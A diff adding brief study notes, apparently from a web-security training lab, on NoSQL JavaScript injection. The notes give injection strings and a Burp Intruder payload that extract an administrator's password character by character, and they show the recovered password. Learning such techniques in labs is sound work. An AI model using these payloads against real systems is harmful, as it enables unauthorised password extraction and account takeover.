@@ -1,0 +1,23 @@
+in a searching system of users extracting data can occur using commands like this:
+
+admin' && this.password[0] == 'a' || 'a'=='b
+
+This returns the first character of the user's password string, 
+enabling you to extract the password character by character.
+
+You can also use the javascript match() function:
+admin' && this.password.match(/\d/) || 'a'=='b
+
+check the length of the password of the admin user
+administrator' && this.password.length < 30 || 'a'=='b
+
+until given back a different response
+
+eventually getting 8 as the length
+
+use this then in itruder:
+administrator'+%26%26+this.password[§0§]+%3d%3d+'§p§'+||+'a'%3d%3d'b
+
+this gives the password of:
+pzukuhuh
+
